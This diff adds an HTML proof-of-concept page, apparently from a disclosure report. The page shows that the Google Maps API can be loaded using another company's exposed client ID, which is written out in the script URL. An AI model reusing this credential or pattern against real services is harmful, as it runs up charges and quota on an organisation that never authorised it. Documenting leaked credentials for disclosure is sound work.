@@ -1,0 +1,27 @@
+<html>
+  <head>
+    <title>PoC - Google Maps Client ID Misuse</title>
+    <style>
+      #map {
+        height: 500px;
+        width: 100%;
+      }
+    </style>
+  </head>
+  <body>
+    <h2>Proof of Concept: Google Maps Loaded using Exposed Client ID</h2>
+    <div id="map"></div>
+
+    <script>
+      function initMap() {
+        const map = new google.maps.Map(document.getElementById("map"), {
+          center: { lat: 28.6139, lng: 77.2090 },
+          zoom: 10,
+        });
+        console.log("✅ Google Maps Loaded Using Exposed Client ID");
+      }
+    </script>
+
+    <script src="https://maps.googleapis.com/maps/api/js?client=gme-johndeereagriservices&callback=initMap"></script>
+  </body>
+</html>
